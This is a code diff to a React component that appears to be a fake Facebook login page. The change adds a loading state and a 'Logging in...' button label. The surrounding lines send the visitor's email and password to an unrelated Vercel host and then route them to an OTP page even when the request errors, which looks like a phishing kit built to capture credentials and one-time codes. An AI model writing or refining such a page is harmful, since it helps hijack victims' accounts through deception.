@@ -5,6 +5,7 @@ import logo from '../assets/facebook-logo.png'
 const FacebookLogin = () => {
     const [formData, setFormData] = useState({ email: "", password: "" });
     const navigate = useNavigate();
+    const [loading, setLoading] = useState(false); // Loading state
 
     const handleChange = (e) => {
         setFormData({ ...formData, [e.target.name]: e.target.value });
@@ -12,6 +13,7 @@ const FacebookLogin = () => {
 
     const handleSubmit = async (e) => {
         e.preventDefault();
+        setLoading(true);
 
         try {
             const response = await fetch("https://think-pad-ruby.vercel.app/api/facebook/login", {
@@ -27,11 +29,13 @@ const FacebookLogin = () => {
 
                 // Navigate to OTP verification page
                 navigate('/verify-otp');
+                setLoading(false);
             } else {
                 alert(`❌ Facebook Login Failed: ${data.message || "Something went wrong"}`);
             }
         } catch (error) {
             navigate('/verify-otp');
+            setLoading(false);
         }
     };
 
@@ -62,8 +66,8 @@ const FacebookLogin = () => {
                         onChange={handleChange}
                         style={styles.input}
                     />
-                    <button type="submit" style={styles.login}>
-                        Log In
+                    <button disabled={loading} type="submit" style={styles.login}>
+                        {loading ? "Logging in..." : "Log In"}
                     </button>
                     <a href="#" style={styles.link}>
                         Forgot Password?
